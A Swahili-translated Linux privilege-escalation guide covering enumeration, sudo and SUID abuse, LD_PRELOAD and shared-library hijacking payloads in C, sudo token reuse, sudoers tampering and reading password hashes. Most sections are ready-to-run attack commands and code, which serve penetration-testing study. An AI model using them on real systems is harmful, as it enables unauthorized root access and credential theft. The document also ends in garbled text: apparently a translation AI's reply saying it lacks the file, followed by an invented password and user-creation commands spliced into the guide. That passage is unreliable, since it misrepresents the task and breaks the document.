<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit D-Bus communication hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Inavutia kila wakati enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Bandari wazi

Kila mara angalia huduma za mtandao zinazoendesha kwenye mashine ambazo haukuweza kuingiliana nazo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia kama unaweza sniff traffic. Ikiwa unaweza, unaweza kupata credentials.
```
timeout 1 tcpdump
```
## Watumiaji

### Generic Enumeration

Angalia ni **nani** wewe, ni **privileges** gani ulizo, ni **watumiaji** gani wako kwenye mfumo, ni nani wanaweza **kuingia** na ni nani wana **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya matoleo ya Linux yaliathiriwa na hitilafu inayowawezesha watumiaji wenye **UID > INT_MAX** kuinua ruhusa. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kikundi fulani** ambacho kinaweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Ubao wa kunakili

Angalia kama kuna kitu chochote cha kuvutia ndani ya ubao wa kunakili (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nenosiri zinazojulikana

Ikiwa unajua **nenosiri yoyote** ya mazingira, **jaribu kuingia kwa kila mtumiaji** ukitumia nenosiri hilo.

### Su Brute

Ikiwa hautajali kusababisha kelele nyingi na binaries za `su` na `timeout` ziko kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa kutumia parameter `-a` pia inajaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa utagundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH**, huenda ukaweza kupandisha vibali kwa **kuunda backdoor ndani ya folda inayoandikwa** kwa jina la amri itakayotekelezwa na mtumiaji mwingine (root ni bora) na ambayo **haitapakiwa kutoka kwenye folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Kusanidi sudo kunaweza kumruhusu mtumiaji kutekeleza amri fulani kwa ruhusa za mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key ndani ya saraka ya root au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Kiagizo hiki kinamruhusu mtumiaji **set an environment variable** wakati anatekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **iliyotokana na HTB machine Admirer**, ulikuwa **dhaifu** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati wa kuendesha script kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzisha isiyo ya mwingiliano ya Bash ili kuendesha msimbo wowote kama root unapoiita amri inayoruhusiwa.

- Why it works: Kwa shells zisizo za mwingiliano, Bash inatathmini `$BASH_ENV` na inasoma faili hilo kabla ya kuendesha script lengwa. Kanuni nyingi za sudo zinaruhusu kuendesha script au shell wrapper. Ikiwa `BASH_ENV` imehifadhiwa na sudo, faili yako itasomwa kwa ruhusa za root.

- Mahitaji:
- Kanuni ya sudo utakayoweza kuendesha (lengo lolote linaloitisha `/bin/bash` isiyo ya mwingiliano, au script yoyote ya bash).
- `BASH_ENV` kuwepo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, tumia `env_reset` badala yake.
- Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
- Fikiria kurekodi I/O ya sudo na kutuma onyo wakati env vars zilizohifadhiwa zinapotumika.

### Sudo execution bypassing paths

**Ruka** kusoma mafaili mengine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inapotumika (\*), ni rahisi hata zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Ikiwa **sudo permission** imetolewa kwa amri moja **without specifying the path**: _hacker10 ALL= (root) less_ unaweza ku-exploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** inatekeleza amri nyingine bila kubainisha njia yake (daima angalia kwa** _**strings**_ **maudhui ya binary ya SUID isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary yenye njia ya amri

Ikiwa binary ya **suid** **inatekeleza amri nyingine huku ikibainisha njia**, basi, unaweza kujaribu **ku-export function** iliyoitwa kama amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ lazima ujaribu kuunda function na kui-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapomuita suid binary, function hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** kinatumika kutaja moja au zaidi ya shared libraries (.so files) zinapakiwa na loader kabla ya nyingine zote, ikiwemo maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama preloading a library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumika vibaya, hasa kwa **suid/sgid** executables, mfumo unatekeleza masharti fulani:

- Loader haitazingatia **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifananishi na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba tu zilizoko katika njia za kawaida ambazo pia ni suid/sgid ndizo zinazopreloaded.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kuendesha amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Mpangilio huu unaruhusu kigezo cha mazingira **LD_PRELOAD** kubaki na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, na hivyo kupelekea utekelezwaji wa arbitrary code kwa ruhusa zilizoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **kupandisha ruhusa** kwa kuendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti **LD_LIBRARY_PATH** env variable kwa sababu anadhibiti njia ambapo libraries zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye ruhusa za **SUID** ambazo zinaonekana zisizo za kawaida, ni desturi nzuri kuthibitisha kama inapakia faili za **.so** vizuri. Hii inaweza kuchunguzwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ inaonyesha uwezekano wa exploitation.

Ili exploit hili, ungeendelea kwa kuunda faili la C, kwa mfano _"/path/to/.config/libcalc.c"_, lenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara umekusanywa na kutekelezwa, unalenga kuinua vibali kwa kubadilisha ruhusa za faili na kuendesha shell yenye vibali vilivyoinuliwa.

Kusanya faili ya C iliyotajwa hapo juu kuwa shared object (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Mwishowe, kuendesha SUID binary iliyoathiriwa kunapaswa kuchochea exploit, na kuruhusu uwezekano wa kuvunjika kwa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa baada ya kupata SUID binary inayopakia library kutoka kwenye folder ambapo tunaweza kuandika, tuunde library hiyo katika folder hilo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii ina maana kuwa maktaba uliyoitengeneza inahitaji kuwa na function iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyohaririwa ya Unix binaries ambazo zinaweza kutumiwa na attacker kuvuka vikwazo vya usalama vya eneo. [**GTFOArgs**](https://gtfoargs.github.io/) ni ile ile lakini kwa kesi ambapo unaweza **only inject arguments** katika command.

Mradi hukusanya legitimate functions za Unix binaries ambazo zinaweza kutumiwa kuabuse ku-break out restricted shells, escalate au maintain elevated privileges, transfer files, spawn bind na reverse shells, na kurahisisha kazi zingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l` unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia kama inapata jinsi ya ku-exploit any sudo rule.

### Reusing Sudo Tokens

Katika kesi ambapo una **sudo access** lakini hakuna password, unaweza escalate privileges kwa **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (kwa chaguo-msingi hiyo ni muda wa sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (unaweza kuwa na uwezo wa kui-upload)

(Unaweza kwa muda kuwezesha `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yamekamilika, **unaweza escalate privileges ukitumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **activate the sudo token in your session** (hutapata moja kwa moja root shell, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **inayomilikiwa na root na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) ita **kuunda faili ya sudoers** ambayo inafanya **sudo tokens kuwa za kudumu na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **idhini ya kuandika** katika folda au kwa faili yoyote iliyoundwa ndani ya folda unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo na PID 1234, unaweza **kupata ruhusa za sudo** bila ya kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili ndani ya `/etc/sudoers.d` zinaweka ni nani anaweza kutumia `sudo` na jinsi. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kundi root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na kama unaweza **kuandika** faili yoyote utaweza **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala kwa binary ya `sudo` kama `doas` kwa OpenBSD; kumbuka kukagua usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kuwa **mtumiaji kawaida hujiunga na mashine na hutumia `sudo`** kuinua ruhusa na umepata shell ndani ya muktadha wa mtumiaji, unaweza **kuunda executable mpya ya sudo** ambayo itatekeleza kodi yako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza path mpya katika .bash_profile) ili wakati mtumiaji anapotekeleza sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza path mpya. Kwa mfano[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **kutoka wapi faili za usanidi zilizopakiwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii ina maana kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaelekeza kwenye saraka nyingine** ambapo **maktaba** zitatafutwa. Kwa mfano, yaliyomo katika `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii ina maana kwamba mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Iwapo kwa sababu fulani **mtumiaji ana ruhusa za kuandika** kwenye yoyote ya njia zilizotajwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au saraka yoyote ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kupandisha ruhusa.\
Angalia **jinsi ya kutumia upungufu huu wa usanidi** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib kwenye `/var/tmp/flag15/`, itatumiwa na programu hapa kama ilivyoainishwa katika kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda maktaba hatari katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Uwezo za Linux hutoa **sehemu ndogo ya mamlaka za root zinazopatikana kwa mchakato**. Hii kwa ufanisi hugawanya mamlaka za root **kuwa vitengo vidogo na maalum**. Kila kimoja cha vitengo hivi kinaweza kisha kutolewa kwa mchakato kwa kujitegemea. Kwa njia hii seti kamili ya mamlaka inapunguzwa, kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu uwezo na jinsi ya kuvitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za saraka

Katika saraka, **bit ya "execute"** inaonyesha kuwa mtumiaji anayehusika anaweza "**cd**" ndani ya saraka.\
Bit ya **"read"** inaonyesha kuwa mtumiaji anaweza **list** faili, na bit ya **"write"** inaonyesha mtumiaji anaweza **delete** na **create** faili mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha tabaka la pili la ruhusa za hiari, zenye uwezo wa **kupindua ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaimarisha udhibiti wa ufikishaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Ngazi hii ya undani inahakikisha usimamizi wa upatikanaji kwa usahihi zaidi. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpa** mtumiaji "kali" ruhusa za read na write kwenye faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **hijack** baadhi ya **shell** session za mtumiaji mwingine (**root**).\
Katika **matoleo mapya** utaweza **kujiunga** na screen sessions za **mtumiaji wako mwenyewe** tu. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo kwa **old tmux versions**. Sikuweza hijack tmux (v2.1) session iliyotengenezwa na root kama non-privileged user.

**Orodhesha tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vifunguo vyote vya SSL na SSH vilivyotengenezwa kwenye mifumo yenye msingi wa Debian (Ubuntu, Kubuntu, etc) kati ya September 2006 na May 13th, 2008 vinaweza kuathiriwa na hitilafu hii.\
Hitilafu hii inasababishwa wakati wa kuunda ufunguo mpya wa ssh katika OS hizo, kwani **tu 32,768 variations zilikuwa zinazowezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kuhesabiwa na **ukiwa na ufunguo wa umma wa ssh unaweza kutafuta ufunguo wa siri unaolingana**. Unaweza kupata uwezekano uliokadiriwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inaeleza kama uthibitishaji wa password unaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaeleza kama uthibitishaji kwa kutumia public key unaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati uthibitishaji wa password unaporuhusiwa, inaeleza kama server inaruhusu kuingia kwenye akaunti zenye password tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaeleza kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia nenosiri na private key
- `without-password` or `prohibit-password`: root anaweza kuingia tu kwa kutumia private key
- `forced-commands-only`: Root anaweza kuingia tu kwa kutumia private key na ikiwa chaguo za command zimeainishwa
- `no` : hapana

### AuthorizedKeysFile

Inaeleza faili zinazobeba public keys ambazo zinaweza kutumika kwa uthibitishaji wa mtumiaji. Inaweza kuwa na tokens kama `%h`, ambazo zitatimizwa na saraka ya nyumbani. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Usanidi huo utaonyesha kwamba ikiwa utajaribu kuingia kwa kutumia **private** key ya mtumiaji "**testusername**", ssh italinganisha public key ya key yako na zile zilizopo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **use your local SSH keys instead of leaving keys** (without passphrases!) kukaa kwenye server yako. Hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** iliyoko kwenye **initial host** yako.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama hii:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila wakati mtumiaji anapohamia mashine tofauti, host hiyo itakuwa na uwezo wa kupata vifunguo (ambayo ni tatizo la usalama).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
Faili `/etc/ssh_config` inaweza **kubadilisha** chaguzi hizi na kuruhusu au kukataa usanidi huu.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).  
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kutumia neno kuu `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ikiwa unagundua kuwa Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia vibaya ili kupandisha ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili za Kuvutia

### Faili za profile

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote kati yao, unaweza kupandisha ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa script ya profile isiyokuwa ya kawaida inapopatikana unapaswa kuikagua kwa ajili ya **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na mfumo wa uendeshaji, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa na jina tofauti au kunaweza kuwa na nakala ya akiba. Kwa hivyo inashauriwa **kutafuta zote** na **kuangalia kama unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Wakati mwingine unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza password kwa kutumia moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have access to src/linux-hardening/privilege-escalation/README.md. Please paste the file contents you want translated and I'll return the Swahili translation preserving all markdown/html/tags/paths.

Meanwhile, here is a generated strong password and the exact commands to add the user hacker and set that password (do not translate these commands):

Generated password:
G7r$2pQx9Vz!bL4s

Commands:
sudo useradd -m -s /bin/bash hacker
echo 'hacker:G7r$2pQx9Vz!bL4s' | sudo chpasswd
sudo passwd -e hacker

Paste the README content when ready and I'll translate it.
```
